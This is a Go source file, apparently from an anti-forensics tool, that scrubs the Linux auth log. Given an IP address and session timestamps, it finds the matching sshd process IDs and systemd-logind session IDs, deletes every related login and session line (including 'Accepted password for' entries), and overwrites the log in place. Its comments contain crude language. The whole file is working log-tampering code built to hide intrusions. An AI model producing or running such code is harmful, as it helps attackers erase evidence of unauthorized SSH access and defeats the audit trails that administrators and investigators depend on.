package authlog

import (
	"fmt"
	"os"
	"regexp"
	"sort"
	"strings"
	check "test/CHECK"
	vars "test/VARS"
	"time"
)

// This shit deletes auth log logs.
// Masturbation goes cloud
var systemdLogInd string
var sessionId string
var indexToStartForSystemLog int
var indexToStartManipulate int

func DeleteSessionAndSudoeSyslogAuthlog(pattern string, FileToDelLines string) error {
	file, err := os.ReadFile(FileToDelLines)
	if err != nil {
		return err
	}
	stringSliceOfLogFile := strings.Split(string(file), "\n")
	fmt.Println(pattern)
	re := regexp.MustCompile(pattern)
	linesToDel := []int{}
	for i, j := range stringSliceOfLogFile {
		match := re.MatchString(j)
		if match {
			linesToDel = append(linesToDel, i)
			fmt.Println(j, "  ", i)

		}
	}
	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
	for _, j := range linesToDel {
		fmt.Println(j, "<<<<")
		stringSliceOfLogFile = Remove(stringSliceOfLogFile, j)
	}

	err = CopyFile(FileToDelLines, stringSliceOfLogFile)
	check.Check("error on Coping File at auth log", err)
	return nil

}

func DeleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string, ip *string) (string, error) {
	file, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	stringSliceOfAothLog := strings.Split(string(file), "\n")

	matchStartID := ""
	for i, j := range stringSliceOfAothLog {
		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStart[1]) {
			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			matchStartID = matches[0][1] // ID
			indexToStartManipulate = i
			fmt.Println(j, matches[0][1], i, "AAAAAA")
			break
		}
	}

	matchStopID := ""
	for i, j := range stringSliceOfAothLog[indexToStartManipulate:] {
		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStop[1]) {
			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			matchStopID = matches[0][1]
			fmt.Println(j, matches[0][1], i, "XAXAXAXAXAX")
			break
		}
	}

	IntlinesToDel := []int{}
	StringLinesToDel := []string{}
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStartID, false)
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID, false)
	// GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID)

	for _, j := range stringSliceOfAothLog[indexToStartForSystemLog:] {
		pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]: (New session|Session \d+ )`)
		matches := pattern.FindAllStringSubmatch(j, -1)

		if len(matches) > 0 {
			pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			systemdLogInd = matches[0][1]
			pattern = regexp.MustCompile(`New session (\d+)`)
			matchesSession := pattern.FindStringSubmatch(j)
			fmt.Println(matchesSession, "AAAAA")
			sessionId = matchesSession[1]
			break
		}
	}
	patternSystemLogInd := fmt.Sprintf(`^.*systemd-logind\[%s\].*(Session %s logged out|Removed session %s|New session %s)`, systemdLogInd, sessionId, sessionId, sessionId)
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, patternSystemLogInd, true)

	sort.Sort(sort.Reverse(sort.IntSlice(IntlinesToDel)))
	fmt.Printf("Final Data: StartLogin %s, EndLogin: %s systemLoginInId :%s, Lines To Del %v, Session ID ,%s \n", matchStartID, matchStopID, systemdLogInd, IntlinesToDel, sessionId)
	for _, index := range IntlinesToDel {
		stringSliceOfAothLog = Remove(stringSliceOfAothLog, index)
	}

	err = CopyFile(vars.AUTH_LOG, stringSliceOfAothLog)
	check.Check("Error on Copy file at AuthLog", err)
	return sessionId, nil
	// return nil
}

func CopyFile(filepath string, strings []string) error {

	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	check.Check("Error on Open File", err)
	defer file.Close()

	for _, j := range strings {
		_, err := file.WriteString(j + "\n")
		check.Check("Error on Writing File ", err)
	}

	fmt.Println("All strings written to file successfully")
	return nil
}

func GetIndexesToDelete(stringSliceOfAothLog *[]string, IntlinesToDel *[]int, StringLinesToDel *[]string, matchString string, getSession bool) {

	re := regexp.MustCompile(matchString)
	for i, j := range (*stringSliceOfAothLog)[indexToStartManipulate:] {
		if re.MatchString(j) {

			(*IntlinesToDel) = append((*IntlinesToDel), i+indexToStartManipulate)
			(*StringLinesToDel) = append((*StringLinesToDel), j)
			if strings.Contains(j, "Accepted password for") {
				indexToStartForSystemLog = i + indexToStartManipulate
			}
		}
	}
}

func Remove(slice []string, index int) []string {
	if index < 0 || index >= len(slice) {
		fmt.Println("Index out of range")
		return slice
	}
	return append(slice[:index], slice[index+1:]...)
}

func GetTimeStamps(sessionStart, sessionStop int) ([]string, []string) {
	tStart := time.Unix(int64(sessionStart), 0).UTC()
	localTimeStart := tStart.Local()
	SplitTimeStart := strings.Split(localTimeStart.Format("2006-01-02 15:04:05"), " ")

	tStop := time.Unix(int64(sessionStop), 0).UTC()
	localTimeStop := tStop.Local()
	SplitTimeStop := strings.Split(localTimeStop.Format("2006-01-02 15:04:05"), " ")
	fmt.Println(SplitTimeStart, SplitTimeStop)

	return SplitTimeStart, SplitTimeStop

}
